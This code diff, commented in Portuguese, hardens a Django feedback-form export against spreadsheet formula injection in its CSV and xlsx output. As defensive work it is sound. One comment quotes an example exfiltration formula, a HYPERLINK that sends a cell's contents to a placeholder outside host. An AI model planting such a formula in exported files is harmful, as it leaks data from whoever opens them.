@@ -109,6 +109,27 @@ def _linhas_e_colunas():
     return cabecalhos, linhas
 
 
+# Os caracteres com que o Excel começa a ler uma FÓRMULA. Importam porque a
+# fonte deste arquivo é texto livre de gente ANÔNIMA: o formulário é público,
+# sem login, e quem tem o link escreve o que quiser no campo aberto.
+#
+# Sem tratamento, `=HYPERLINK("http://fora.tld/?d="&A2,"clique")` deixa de ser
+# texto e vira fórmula VIVA na planilha — e o dano nem precisa de má-fé para
+# aparecer: quem exporta nunca lê o que a pessoa escreveu, vê `#NAME?` no lugar.
+# A planilha, como diz a própria view, "sai do sistema e passa a circular por
+# e-mail e pendrive".
+#
+# A NEUTRALIZAÇÃO É NA SAÍDA, não na entrada: a validação do formulário deve
+# continuar RECUSANDO o que é inválido, nunca reescrevendo em silêncio o que a
+# pessoa respondeu. O texto guardado no banco continua sendo exatamente o que
+# ela digitou; o que muda é como o arquivo o declara.
+_PREFIXOS_DE_FORMULA = ('=', '+', '-', '@', '\t', '\r')
+
+
+def _e_arriscado(valor) -> bool:
+    return isinstance(valor, str) and valor[:1] in _PREFIXOS_DE_FORMULA
+
+
 def _nome_do_arquivo(extensao: str) -> str:
     return f'feedbacks_{timezone.localdate().isoformat()}.{extensao}'
 
@@ -122,7 +143,15 @@ def exportar_csv() -> HttpResponse:
     # arquivo estaria "certo" e inútil.
     escritor = csv.writer(buffer, delimiter=';')
     escritor.writerow(cabecalhos)
-    escritor.writerows(linhas)
+    # No CSV a única defesa é o APÓSTROFO à frente: o Excel reinterpreta o
+    # arquivo inteiro ao abrir, e aspas não o impedem de avaliar `=...`. Aqui os
+    # quatro prefixos contam (no xlsx só o `=` vira fórmula, no CSV não).
+    # O apóstrofo entra APENAS quando o valor começa com um deles — texto comum
+    # sai idêntico ao que a pessoa escreveu.
+    escritor.writerows(
+        [f"'{valor}" if _e_arriscado(valor) else valor for valor in linha]
+        for linha in linhas
+    )
 
     resposta = HttpResponse(
         '﻿' + buffer.getvalue(),
@@ -147,6 +176,16 @@ def exportar_xlsx() -> HttpResponse:
         celula.font = Font(bold=True)
     for linha in linhas:
         ws.append(linha)
+        # DECLARA A CÉLULA COMO TEXTO em vez de prefixar com apóstrofo: o valor
+        # guardado continua sendo exatamente o que a pessoa escreveu, e o Excel
+        # exibe a string em vez de avaliá-la. Prefixar aqui sujaria o dado — no
+        # xlsx o apóstrofo NÃO é removido na leitura, ao contrário do que
+        # acontece quando se digita na planilha. Medido com openpyxl 3.1.5: sem
+        # isto, `=...` sai com `data_type='f'`, uma fórmula de verdade.
+        for celula in ws[ws.max_row]:
+            if _e_arriscado(celula.value):
+                celula.data_type = 's'
+                celula.quotePrefix = True
 
     # `freeze_panes` + auto-filtro: a planilha nasce navegável. Sem isso, uma
     # tabela com dezenas de colunas de pergunta é ilegível ao rolar.
@@ -184,6 +223,12 @@ def previa(offset: int = 0, limit: int = 100) -> dict:
     `key` sintética (`c0`, `c1`, …) porque o diálogo indexa a linha por chave, e
     os rótulos são texto livre da definição do formulário: dois campos podem ter
     o mesmo label, e aí uma coluna sobrescreveria a outra no dicionário.
+
+    A PRÉVIA NÃO NEUTRALIZA PREFIXO DE FÓRMULA, e isso é deliberado: ela é
+    desenhada no navegador, onde `=` é só um caractere. Aplicar aqui o mesmo
+    apóstrofo do CSV mostraria à pessoa um texto que ela não escreveu — e a
+    promessa da prévia é sobre QUAIS COLUNAS E LINHAS saem no arquivo, não sobre
+    o artifício com que cada formato declara que a célula é texto.
     """
     cabecalhos, linhas = _linhas_e_colunas()
     colunas = [{'key': f'c{i}', 'label': rotulo} for i, rotulo in enumerate(cabecalhos)]
